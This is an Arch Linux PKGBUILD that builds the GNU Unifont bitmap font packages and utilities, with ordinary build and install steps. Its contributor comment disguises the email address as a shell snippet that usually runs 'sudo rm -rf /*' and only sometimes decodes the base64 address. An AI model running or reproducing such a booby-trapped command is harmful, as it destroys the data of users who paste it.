# Maintainer: neeshy <neeshy@tfwno.gf>
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=('pcf-unifont'
         'psf-unifont'
         'hex-unifont'
         'unifont-utils')
pkgbase=unifont
pkgver=14.0.04
pkgrel=1
pkgdesc="A free bitmap font with wide Unicode support (PCF, PSF and hex versions)"
arch=('any')
url="http://unifoundry.com/"
license=('GPL2' 'custom:OFL')
source=("http://unifoundry.com/pub/unifont/unifont-$pkgver/unifont-$pkgver.tar.gz"{,.sig})
sha256sums=('1f5e517ccf4cb3a09cffe31ac52de70d8f076fe024a4a2453e07db57bb64febb'
            'SKIP')
validpgpkeys=('95D2E9AB8740D8046387FD151A09227B1F435A33') # Paul Hardy <unifoundry@unifoundry.com>

build() {
  cd "$srcdir/unifont-$pkgver/src"
  make
}

package_pcf-unifont() {
  pkgdesc="A free bitmap font with wide Unicode support (PCF version)"

  cd "$srcdir/unifont-$pkgver/font/precompiled"
  install -Dm644 "unifont-$pkgver.pcf.gz" "$pkgdir/usr/share/fonts/misc/unifont.pcf.gz"
}

package_psf-unifont() {
  pkgdesc="A free bitmap font with wide Unicode support (PSF version)"

  cd "$srcdir/unifont-$pkgver/font/precompiled"
  install -Dm644 "Unifont-APL8x16-$pkgver.psf.gz" "$pkgdir/usr/share/kbd/consolefonts/Unifont-APL8x16.psf.gz"
}

package_hex-unifont() {
  pkgdesc="A free bitmap font with wide Unicode support (hex version)"

  cd "$srcdir/unifont-$pkgver/font/precompiled"
  install -Dm644 "unifont-$pkgver.hex" "$pkgdir/usr/share/unifont/unifont.hex"
}

package_unifont-utils() {
  pkgdesc="A free bitmap font with wide Unicode support - utilities"
  arch=('x86_64')
  depends=('perl')
  optdepends=(
    'perl-wx: for the unifont-viewer utility'
    'perl-gd: for the unihex2png and unipng2hex utilities'
  )

  cd "$srcdir/unifont-$pkgver"
  make -C src install PREFIX="$pkgdir/usr" LOCALBINDIR=../bin
  make -C man install PREFIX="$pkgdir/usr" COMPRESS=1
}
